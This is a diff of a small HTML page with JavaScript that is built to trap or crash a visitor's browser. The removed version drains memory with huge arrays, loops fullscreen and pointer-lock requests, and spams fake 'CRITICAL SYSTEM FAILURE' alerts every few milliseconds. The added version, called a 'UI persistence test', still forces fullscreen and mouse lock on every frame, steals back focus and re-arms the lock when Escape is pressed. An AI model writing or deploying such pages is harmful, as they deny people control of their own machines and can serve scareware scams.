@@ -1,54 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚡ SYSTEM STRESS TEST ⚡</title>
+    <title>⚡ UI PERSISTENCE TEST ⚡</title>
     <style>
         body { 
-            background: #000; color: #f00; 
+            background: #000; color: #00ff00; 
             font-family: 'Courier New', monospace; 
             height: 100vh; margin: 0;
             display: flex; align-items: center; justify-content: center;
             overflow: hidden; cursor: none;
         }
-        h1 { font-size: 2rem; text-align: center; text-transform: uppercase; }
+        h1 { font-size: 2rem; text-align: center; }
     </style>
 </head>
 <body>
-    <h1>[ CLICK TO INITIALIZE CORE ]</h1>
+    <div id="status">
+        <h1>[ SYSTEM STABILIZED ]</h1>
+        <p style="text-align:center">Click to engage UI lock.</p>
+    </div>
 
     <script>
-        let memoryDrain = [];
+        function engageLock() {
+            // Update the UI
+            document.getElementById('status').innerHTML = "<h1>LOCK ENGAGED</h1><p>Pressing 'Esc' will re-trigger.</p>";
 
-        function kill() {
-            // 1. The Fullscreen / Pointer Lock Loop
-            // This runs ~60-120 times per second
-            function spam() {
-                document.documentElement.requestFullscreen().catch(() => {});
+            // 1. The Persistence Loop
+            // This runs as fast as the monitor refreshes (60Hz+)
+            // It is lightweight (no memory creation) so there is NO LAG.
+            function maintain() {
+                // Constantly asks for fullscreen and mouse lock
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(() => {});
+                }
                 document.body.requestPointerLock();
                 
-                // 2. Exponential Memory Leak 
-                // Each frame, we add massive junk to RAM
-                for(let i = 0; i < 100; i++) {
-                    memoryDrain.push(new Array(1000000).fill("💀"));
-                }
-                
-                requestAnimationFrame(spam);
+                requestAnimationFrame(maintain);
             }
 
-            // 3. The Dialog Trap
-            // Spams alerts so fast the user can't move the mouse
-            const alertLoop = () => {
-                alert("CRITICAL SYSTEM FAILURE\nRECOVERY IMPOSSIBLE");
-                setTimeout(alertLoop, 5);
+            // 2. The Interaction Hijack
+            // If the user clicks "OK" on an alert or tries to leave,
+            // we immediately pull them back in.
+            window.onblur = () => {
+                console.log("Focus lost - regaining...");
+                window.focus();
             };
 
-            spam();
-            alertLoop();
+            maintain();
         }
 
-        // Trigger everything on first interaction
-        window.addEventListener('click', kill);
-        window.addEventListener('keydown', kill);
+        // Start on first click
+        window.addEventListener('click', engageLock);
+
+        // Prevent some keyboard shortcuts from breaking focus
+        window.onkeydown = (e) => {
+            // If they try to hit Esc, we refresh the lock
+            if (e.key === "Escape") {
+                setTimeout(engageLock, 10);
+            }
+        };
     </script>
 </body>
 </html>
+
